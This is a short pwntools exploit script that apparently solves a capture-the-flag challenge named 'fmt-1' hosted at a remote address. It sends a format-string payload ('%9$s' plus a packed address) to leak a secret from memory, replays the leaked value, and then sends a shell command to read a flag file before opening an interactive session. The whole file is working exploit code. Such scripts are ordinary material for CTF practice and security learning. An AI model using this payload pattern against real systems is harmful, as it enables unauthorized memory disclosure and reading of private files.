#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './fmt-1'
LIBC = ''
HOST = '140.110.112.77'
PORT = 4002

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

secret = 0x404050
input()
r.sendafter('Input:', b"%9$sAAAA" + p64(secret))
flag = r.recv(0x10)
r.sendafter('Input:', flag)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
